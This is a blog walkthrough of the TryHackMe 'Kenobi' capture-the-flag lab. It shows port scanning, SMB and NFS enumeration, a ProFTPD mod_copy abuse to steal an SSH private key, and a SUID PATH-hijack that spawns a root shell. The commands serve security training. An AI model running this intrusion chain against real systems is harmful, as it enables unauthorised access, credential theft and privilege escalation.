---
title: "Help Me, Obi-Wan Kenobi. You're My Only Hope: Navigating the Kenobi CTF on TryHackMe"
slug: kenobi
layout: post
excerpt_separator:  <!--more-->
categories:
  - ctfs
---

This walkthrough will cover the [Kenobi](https://tryhackme.com/room/kenobi) CTF found on [TryHackMe](https://tryhackme.com). It will include accessing a Samba share, exploiting a vulnerable version of ProFtpd to gain initial access, and escalating privileges to root using a SUID binary.

### Step 1: Nmap

```bash
nmap -A -p- -T4 10.10.117.14 -vvv
```

```plaintext
PORT      STATE SERVICE     REASON         VERSION
21/tcp    open  ftp         syn-ack ttl 61 ProFTPD 1.3.5
22/tcp    open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8m00IxH/X5gfu6Cryqi5Ti2TKUSpqgmhreJsfLL8uBJrGAKQApxZ0lq2rKplqVMs+xwlGTuHNZBVeURqvOe9MmkMUOh4ZIXZJ9KNaBoJb27fXIvsS6sgPxSUuaeoWxutGwHHCDUbtqHuMAoSE2Nwl8G+VPc2DbbtSXcpu5c14HUzktDmsnfJo/5TFiRuYR0uqH8oDl6Zy3JSnbYe/QY+AfTpr1q7BDV85b6xP97/1WUTCw54CKUTV25Yc5h615EwQOMPwox94+48JVmgE00T4ARC3l6YWibqY6a5E8BU+fksse35fFCwJhJEk6xplDkeauKklmVqeMysMWdiAQtDj
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBpJvoJrIaQeGsbHE9vuz4iUyrUahyfHhN7wq9z3uce9F+Cdeme1O+vIfBkmjQJKWZ3vmezLSebtW3VRxKKH3n8=
|   256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGB22m99Wlybun7o/h9e6Ea/9kHMT0Dz2GqSodFqIWDi
80/tcp    open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind     syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100005  1,2,3      51719/udp6  mountd
|   100005  1,2,3      55558/udp   mountd
|   100005  1,2,3      59043/tcp   mountd
|   100005  1,2,3      60167/tcp6  mountd
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open              syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     syn-ack ttl 61 2-3 (RPC #100227)
34619/tcp open  nlockmgr    syn-ack ttl 61 1-4 (RPC #100021)
46053/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
59043/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
60883/tcp open  mountd      syn-ack ttl 61 1-3 (RPC #100005)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=7/7%OT=21%CT=1%CU=40628%PV=Y%DS=4%DC=T%G=Y%TM=64A89F2C
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10A%TI=Z%II=I%TS=8)SEQ(SP=10
OS:1%GCD=1%ISR=10A%TI=Z%II=I%TS=8)SEQ(SP=101%GCD=1%ISR=10A%TI=Z%CI=I%II=I%T
OS:S=8)SEQ(SP=101%GCD=2%ISR=109%TI=Z%II=I%TS=8)OPS(O1=M509ST11NW7%O2=M509ST
OS:11NW7%O3=M509NNT11NW7%O4=M509ST11NW7%O5=M509ST11NW7%O6=M509ST11)WIN(W1=6
OS:8DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M
OS:509NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T
OS:4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.003 days (since Fri Jul  7 17:22:14 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m03s, deviation: 2h53m12s, median: 2s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| smb2-time: 
|   date: 2023-07-07T23:26:33
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2023-07-07T18:26:33-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 18419/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 14290/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27356/udp): CLEAN (Failed to receive data)
|   Check 4 (port 22821/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

This box contains multiple attack vectors to help enumerate and gather useful information to gain our initial foothold. To begin, we will focus on port 445, SMB.

### Step 2: Enumerate SMB

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691585228290/84eff752-f81c-435c-b68b-1ccd52dca756.png){: .center-image }

Using nmap scripts we can further enumerate port 445 to find available shares.

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-user.nse 10.10.165.161
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691585954065/953e4d73-a1bc-4a00-ac98-8f74d0aa33ec.png){: .center-image }

There are a total of 3 shares. Let's connect to one of them using `smbclient`.

```bash
smbclient //10.10.165.161/anonymous
```

Upon connecting, we discover a `log.txt` file. We can pull this down using the `smbget` command.

```bash
smbget -R smb://10.10.165.161/anonymous
```

### Step 3: Enumerate NFS

Similar to SMB, we can use nmap scripts to further enumerate NFS.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.165.161
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586002335/e4109953-78e4-4363-90be-1f612b046171.png){: .center-image }

We discover `/var` is a mountable network drive.

### Step 4: ProFtpd

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586017713/76be6748-a0ac-4ac2-b3ca-9c36cc354410.png){: .center-image }

Using netcat we can determine what version of ProFtpd is running.

```bash
nc 10.10.165.161 21
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586031160/4ee327c3-db5c-4f4e-84f5-85516d0f28eb.png){: .center-image }

Let's use `searchsploit` to see if this version has a vulnerability.

```bash
searchsploit ProFtpd 1.3.5
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586044971/4a61fc21-4adb-4aba-8c24-23a4b907b6d0.png){: .center-image }

Looks like there is a Metasploit module called `mod_copy`. But let's do this the manual way using netcat.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586051498/7c40718d-2a19-41d5-b4b2-16eebcf79ebd.png){: .center-image }

What we did was move the private key over to `/var` since we discovered that was the mount point during our SMB enumeration. Let's mount to the `/var/tmp` directory now.

```bash
mkdir /mnt/kenobiNFS
mount 10.10.165.161:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
```

We now have the network mounted on our attack box. Let's pull down the `id_rsa` SSH key and use it to connect to the box using Kenobi's account.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586070312/0644a500-f20f-42d9-ac96-acc4bf3aed36.png){: .center-image }

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586074001/0d2a88fc-0940-4a8f-af9a-e5e39d23b076.png){: .center-image }

We're in! You'll find your first flag at `/home/kenobi/user.txt`.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586086159/1358d236-98a7-4cc6-9f10-d8d56b9b7ed1.png){: .center-image }

### Step 5: Privesc and Root

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586100815/57fdc0ed-56d0-4fd7-a43b-79d6e824852c.webp){: .center-image }

Let's search the system for a binary running elevated permissions.

```bash
find / -perm -u=s -type f 2>/dev/null
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586116402/00c9b277-6786-4021-bcb5-da4a7906e0cb.webp){: .center-image }

The binary `/usr/bin/menu` is not ordinary and can be used for elevating privileges. Let's move it over to the `/tmp` directory since we know it's writable. From there we can change the name of `/bin/sh` to `curl` and give it the appropriate permissions to run. From there we will put it on the same path as `/tmp`.

```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
/usr/bin/menu
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1691586137377/5542d71a-f954-47f8-9aac-0806e2c056c3.webp){: .center-image }

And we have root! Type `cat /root/root.txt` and you'll find your last flag.

I hope you enjoyed this walkthrough of the [Kenobi](https://tryhackme.com/room/kenobi) CTF found on [TryHackMe](https://tryhackme.com). Happy Hacking.